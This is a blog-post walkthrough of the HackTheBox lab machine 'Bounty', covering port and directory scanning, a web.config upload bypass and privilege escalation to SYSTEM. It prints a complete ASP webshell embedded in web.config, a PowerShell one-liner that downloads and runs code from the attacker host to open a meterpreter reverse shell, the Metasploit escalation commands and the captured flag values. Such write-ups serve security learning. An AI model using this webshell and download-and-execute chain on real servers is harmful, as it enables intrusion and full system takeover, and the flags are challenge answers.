---
layout: post
title: Hackthebox Bounty Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-09-19/bounty-badge.png)
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a machine "Bounty" on that website.<br>

## Solution
### 1. Initial Enumeration

TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.93 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-18 11:58 EEST
Nmap scan report for 10.10.10.93
Host is up (0.040s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.03 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .aspx
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.93
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     aspx
[+] Timeout:        10s
===============================================================
2019/09/18 15:32:21 Starting gobuster
===============================================================
/transfer.aspx (Status: 200)
/UploadedFiles (Status: 301)
/uploadedFiles (Status: 301)
/uploadedfiles (Status: 301)
===============================================================
2019/09/18 16:01:55 Finished
===============================================================
{% endhighlight %}

### 2. Getting User

We have only one port opening 80 (HTTP).
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-09-19/2019-09-18-12-05-36.png)

We have only 2 path available. "transfer.aspx" and "Uploadedfiles".<br>
If we upload .jpg file with "transfer.aspx", it will be uploaded into "Uploadedfiles".<br>
However, if we upload .aspx file, we get this message below.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-09-19/2019-09-19-10-52-43.png)

By trying some extensions, we can find that it's possible to upload .config file.<br>
Besides, we can find a <a href="https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/">blog post</a> which mentions RCE by uploading web.config.<br>
<br>
To obtain that purpose, at first, create web.config.<br>
This time, web.config template from above website and an ASP webshell is being used.<br>
We can find an ASP webshell <a href="https://github.com/tennc/webshell/blob/master/asp/webshell.asp">here</a>
{% highlight shell %}
root@kali:~# cat web.config 
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />        
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>
<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>
</HTML>
{% endhighlight %}

Upload the "web.config". We get following message.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-09-19/2019-09-18-16-31-36.png)

Then, run the metasploit module "web_delivery".<br>
It launches a meterpreter shell handler and generates a command to be ran on the target server.
{% highlight shell %}
msf5 > use exploit/multi/script/web_delivery 

msf5 exploit(multi/script/web_delivery) > set target 2
target => 2

msf5 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf5 exploit(multi/script/web_delivery) > set lhost 10.10.14.30
lhost => 10.10.14.30

msf5 exploit(multi/script/web_delivery) > set srvhost 10.10.14.30
srvhost => 10.10.14.30

msf5 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.10.14.30:4444 
[*] Using URL: http://10.10.14.30:8080/HqXxAAziFAQHS3
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://10.10.14.30:8080/HqXxAAziFAQHS3');
{% endhighlight %}

After that, open the "web.config" which we uploaded and there should be a form which we can run any Windows command.<br>
By running provided command from "web_delivery", we can achieve a meterpreter shell.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-09-19/2019-09-18-21-13-01.png)
{% highlight shell %}
msf5 exploit(multi/script/web_delivery) > [*] 10.10.10.93      web_delivery - Delivering Payload (2121) bytes
[*] Sending stage (206403 bytes) to 10.10.10.93
[*] Meterpreter session 1 opened (10.10.14.30:4444 -> 10.10.10.93:49164) at 2019-09-18 21:12:31 +0300
{% endhighlight %}

Then, move to the opened session.<br>
We can see that we had a user "merlin".
{% highlight shell %}
msf5 exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: BOUNTY\merlin
{% endhighlight %}

user.txt is in the directory "C:\Users\merlin\Desktop".<br>
{% highlight shell %}
meterpreter > ls
Listing: C:\users\merlin\desktop
================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2018-05-30 00:22:39 +0300  desktop.ini
100666/rw-rw-rw-  32    fil   2018-05-30 23:32:40 +0300  user.txt

meterpreter > cat user.txt
e29ad89891462e0b09741e3082f44a2f
{% endhighlight %}

### 3. Getting Root

Since we already have meterpreter shell, we can use a built-in script "local_exploit_suggester".<br>
At first, background current meterpreter shell.
{% highlight shell %}
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(multi/script/web_delivery) >
{% endhighlight %}

Then, run the script to achieve possible vulnerability for getting higher privilege.
{% highlight shell %}
msf5 exploit(multi/script/web_delivery) > use post/multi/recon/local_exploit_suggester 

msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1

msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.93 - Collecting local exploits for x64/windows...
[*] 10.10.10.93 - 11 exploit checks are being tried...
[+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[*] Post module execution completed
{% endhighlight %}

We found 4 possible vulnerability for gaining administrator.<br>
Try the first one "ms10_092_schelevator".
{% highlight shell %}
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_092_schelevator

msf5 exploit(windows/local/ms10_092_schelevator) > set payload windows/x64/meterpreter/reverse_tcppayload => windows/x64/meterpreter/reverse_tcp

msf5 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.30
lhost => 10.10.14.30

msf5 exploit(windows/local/ms10_092_schelevator) > set lport 8888
lport => 8888

msf5 exploit(windows/local/ms10_092_schelevator) > set session 1
session => 1

msf5 exploit(windows/local/ms10_092_schelevator) > run

[*] Started reverse TCP handler on 10.10.14.30:8888
[*] Preparing payload at C:\Windows\TEMP\YOfmskSrsb.exe
[*] Creating task: Yi4efMFsrEfh
[*] SUCCESS: The scheduled task "Yi4efMFsrEfh" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\Yi4efMFsrEfh...
[*] Original CRC32: 0x5eb2c56c
[*] Final CRC32: 0x5eb2c56c
[*] Writing our modified content back...
[*] Validating task: Yi4efMFsrEfh
[*]
[*] Folder: \
[*] TaskName                                 Next Run Time          Status
[*] ======================================== ====================== ===============
[*] Yi4efMFsrEfh                             10/1/2019 9:27:00 PM   Ready
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "Yi4efMFsrEfh" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "Yi4efMFsrEfh" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (206403 bytes) to 10.10.10.93
[*] SUCCESS: Attempted to run the scheduled task "Yi4efMFsrEfh".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Meterpreter session 2 opened (10.10.14.30:8888 -> 10.10.10.93:49165) at 2019-09-18 21:25:05 +0300
[*] SUCCESS: The scheduled task "Yi4efMFsrEfh" was successfully deleted.
[*] SCHELEVATOR

meterpreter >
{% endhighlight %}

Now we can confirm we had "AUTHORITY\SYSTEM".
{% highlight shell %}
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
{% endhighlight %}

root.txt is in the directory "C:\users\administrator\desktop".
{% highlight shell %}
meterpreter > ls
Listing: C:\users\administrator\desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2018-05-31 00:18:12 +0300  desktop.ini
100666/rw-rw-rw-  32    fil   2018-05-31 00:18:22 +0300  root.txt

meterpreter > cat root.txt
c837f7b699feef5475a0c079f9d4f5ea
{% endhighlight %}
